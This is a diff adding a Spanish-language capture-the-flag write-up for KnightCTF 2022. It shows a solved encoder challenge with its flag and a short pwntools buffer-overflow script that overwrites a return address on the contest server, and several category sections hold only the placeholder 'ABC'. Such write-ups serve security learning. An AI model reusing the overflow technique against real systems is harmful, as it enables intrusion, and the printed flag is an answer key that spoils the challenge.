@@ -1,0 +1,76 @@
+I"�<p>KnightCTF 2022, es el primer <em>capture de flag</em> organizado por <a href="https://knightsquad.org/">Knight Squad</a>, este es de tipo <em>jeopardy</em>, por lo que encontraremos distintas categorias.</p>
+
+<div style="text-align:center">
+  <img src="http://192.168.100.3:80/assets/2022-01-17-KnightCTF-2022/1.png" />
+</div>
+
+<h3 id="reverse-engineering"><a href="#header-3"></a>Reverse Engineering</h3>
+
+<h4 id="the-encoder"><a href="#header-4"></a>The Encoder</h4>
+
+<p><img src="http://192.168.100.3:80/assets/2022-01-17-KnightCTF-2022/2.png" alt="" /></p>
+
+<p>Al extraer y ejecutar el binario, <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/the_encoder.zip">the_encoder.out</a>, vamos a darnos cuenta que nos pregunta por una cadena de caracteres; si introducimos cualquier caracter, el binario nos devolverá un valor bastante similar a los que encontramos en el enunciado del reto.</p>
+
+<p><img src="http://192.168.100.3:80/assets/2022-01-17-KnightCTF-2022/3.png" alt="" /></p>
+
+<p>Por otra parte, podemos darnos cuenta que si introducimos caracteres consecutivos, el valor que nos devuelve también lo es, esto ya nos da una posible idea de por donde van los tiros.</p>
+
+<p><img src="http://192.168.100.3:80/assets/2022-01-17-KnightCTF-2022/4.png" alt="" /></p>
+
+<p><em>Podemos consultar una tabla de código ASCII, para saber en que orden van los caracteres, y así simplificar las cosas.</em></p>
+
+<p><img src="http://192.168.100.3:80/assets/2022-01-17-KnightCTF-2022/5.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{s1Mpl3_3Nc0D3r_1337}
+</code></pre></div></div>
+
+<h3 id="pwn"><a href="#header-3"></a>PWN</h3>
+
+<h4 id="whats-your-name"><a href="#header-4"></a>What’s Your Name</h4>
+
+<p><img src="http://192.168.100.3:80/assets/2022-01-17-KnightCTF-2022/6.png" alt="" /></p>
+
+<p>Al extraer y ejecutar el binario, <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/whats_your_name.zip">whats_your_name</a>, vamos a darnos cuenta que nos pregunta por un nombre; si introducimos cualquier cadena de caracteres, el binario nos devolverá un mensaje de bienvenida.</p>
+
+<p><img src="http://192.168.100.3:80/assets/2022-01-17-KnightCTF-2022/7.png" alt="" /></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'gnome-terminal'</span><span class="p">,</span> <span class="s">'-x'</span><span class="p">]</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"198.211.115.81"</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
+
+<span class="n">flag</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4011d3</span><span class="p">)</span>
+
+<span class="n">junk</span> <span class="o">=</span> <span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">72</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">junk</span> <span class="o">+</span> <span class="n">flag</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h3 id="misc"><a href="#header-3"></a>Misc</h3>
+
+<p>ABC</p>
+
+<h3 id="osint"><a href="#header-3"></a>OSINT</h3>
+
+<p>ABC</p>
+
+<h3 id="steganography"><a href="#header-3"></a>Steganography</h3>
+
+<p>ABC</p>
+
+<h3 id="networking"><a href="#header-3"></a>Networking</h3>
+
+<p>ABC</p>
+
+<h3 id="digital-forensics"><a href="#header-3"></a>Digital Forensics</h3>
+
+<p>ABC</p>
+:ET
